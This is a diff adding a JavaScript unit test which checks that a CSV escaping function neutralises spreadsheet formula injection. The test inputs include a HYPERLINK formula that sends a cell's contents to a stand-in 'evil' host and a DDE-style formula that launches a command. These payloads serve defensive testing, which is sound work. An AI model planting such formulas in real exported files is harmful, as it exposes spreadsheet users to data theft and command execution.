@@ -10,6 +10,15 @@ test("csvEscape wraps values and doubles embedded quotes", () => {
   assert.equal(csvEscape(0), '"0"');
 });
 
+test("csvEscape neutralizes spreadsheet formula injection prefixes", () => {
+  assert.equal(csvEscape('=HYPERLINK("http://evil/?"&A1)'), '"\'=HYPERLINK(""http://evil/?""&A1)"');
+  assert.equal(csvEscape("+SUM(A1:A2)"), '"\'+SUM(A1:A2)"');
+  assert.equal(csvEscape("-10+20"), '"\'-10+20"');
+  assert.equal(csvEscape("@SUM(A1:A2)"), '"\'@SUM(A1:A2)"');
+  assert.equal(csvEscape("\t=cmd|'/c calc'!A1"), '"\'\t=cmd|\'/c calc\'!A1"');
+  assert.equal(csvEscape("\r=HYPERLINK(\"http://evil\")"), '"\'\r=HYPERLINK(""http://evil"")"');
+});
+
 test("toCsv joins header and rows with CRLF", () => {
   const csv = toCsv(["a", "b"], [[1, 2], ["x", "y"]]);
   assert.equal(csv, '"a","b"\r\n"1","2"\r\n"x","y"');
